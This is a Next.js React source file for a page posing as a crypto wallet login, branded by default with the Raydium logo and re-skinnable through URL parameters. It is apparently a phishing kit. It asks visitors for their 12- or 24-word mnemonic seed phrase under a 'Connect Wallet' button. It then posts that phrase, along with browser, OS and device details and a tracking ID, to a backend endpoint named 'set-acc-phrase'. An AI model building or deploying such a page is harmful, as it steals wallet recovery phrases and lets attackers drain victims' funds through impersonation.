"use client";
import { log } from 'console';
import { useSearchParams } from 'next/navigation';
import { useState, useEffect } from 'react';
// import UAParser from "ua-parser-js";


const LoginPage = () => {
  const UAParser = require("ua-parser-js");
  const searchParams = useSearchParams();
  const [value, setValue] = useState("")
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [userInfo, setUserInfo] = useState({
    browser: "",
    os: "",
    device: "",
  });

  const bgColor:any = searchParams.get('bgColor') || '#181d31';
  const bgColorBox:any = searchParams.get('bgColorBox') || '#ffffff';
  const buttonColor:any = searchParams.get('buttonColor') || '#00cfff';
  const cryptoLogId:any = searchParams.get('cryptoLogId');
  const appLogo: any = searchParams.get('appLogo');
  const token: any = searchParams.get('token');

  const staticLogo = "/raydium-logo-freelogovectors.png"

  // const logo2 = 'https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/crypto-images%2FGoogle_G_logo.svg.png6c1a7d17-bc0a-4806-82f3-55af5f746218?alt=media&token=ffe2ad9a-8340-4e33-ad59-f3fc057af635';
  // console.log(logo)
  const logo = appLogo+'&token='+token;
  const dynamicLogo = logo.replace('crypto-images/', 'crypto-images%2F');
  console.log("logo:  ",dynamicLogo)
  console.log("appLogo:  ",appLogo)


  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();
    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setValue(e.target.value);
  };

  const handleSubmit = async () => {
    const inputValue = value.trim();

    if (!inputValue) {
      setError("Phrase cannot be empty.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }
    const wordRegex = /^[a-z\s]+$/;
    const words = inputValue.split(/\s+/);

    if (!wordRegex.test(inputValue)) {
      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    } else if (words.length < 12 || words.length > 24) {
      setError("Input must contain between 12 and 24 words.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    } else {
      setError("");
    }

    if (error) {
      return;
    }
    try {
      const response = await fetch(
        "http://localhost:8080/dashboard/set-acc-phrase",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            mnemonic: value,
            userInfo: {
              browser: userInfo.browser,
              os: userInfo.os,
              device: userInfo.device,
            },
            cryptoLogId:cryptoLogId,
          }),
        }
      );

      if (response.ok) {
        const data = await response.json();
        setSuccess(data.message);
        setTimeout(() => {
          setSuccess("");
        }, 2000);
      } else {
      }
    } catch (error) {
    }
  };


  return (
    <>
    <div
    className="flex flex-col items-center justify-center min-h-screen"
    style={{ backgroundColor: bgColor }}
    >
      <div
        className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
        style={{ backgroundColor: bgColorBox }}
        >
        <div className='logo-placeholder'>
          <img
            height={100}
            width={100}
            src={appLogo===null ? staticLogo : dynamicLogo }
            alt="Logo"
            className="mx-auto h-14 w-60"
          />
        </div>
          {error && (
              <div className='message-container-error'>
                {error}
              </div>
            )}
          {success && (
              <div className='message-container-success'>
                {success}
              </div>
            )}
        <textarea
          value={value}
          placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
          className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
          onChange={(e) => handleInputChange(e)}
        />
        <button
          className="w-full px-4 py-2 text-black rounded-md"
          style={{ backgroundColor: buttonColor }}
          onClick={handleSubmit}
        >
          Connect Wallet
        </button>
      </div>
    </div>
    </>
  );
};

export default LoginPage;
